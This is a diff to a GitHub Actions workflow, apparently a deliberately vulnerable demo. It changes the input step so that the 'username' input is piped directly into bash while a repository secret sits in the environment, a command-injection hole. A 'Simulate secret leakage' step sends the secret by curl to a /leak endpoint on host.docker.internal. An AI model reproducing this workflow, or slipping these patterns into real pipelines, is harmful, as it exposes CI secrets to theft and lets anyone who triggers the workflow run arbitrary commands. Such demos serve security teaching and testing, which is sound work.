@@ -4,21 +4,26 @@ on:
   workflow_dispatch:
     inputs:
       username:
-        description: "Username"
+        description: 'Username to greet'
         required: true
-        default: "normaluser"
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - name: Show input
+        env:
+          MY_SECRET: ${{ secrets.MY_SECRET }}
         run: |
-          echo "Received input: ${{ github.event.inputs.username }}"
+          echo "${{ inputs.username }}" | bash
 
       - name: Simulate secret leakage
         env:
           MY_SECRET: ${{ secrets.MY_SECRET }}
         run: |
           echo "Sending secret to attacker..."
-          curl -X POST http://localhost:8000/leak -d "secret=$MY_SECRET"
+          curl "http://host.docker.internal:8000/leak?secret=$MY_SECRET"
+
+      - name: Complete job
+        run: echo "Job complete"
+
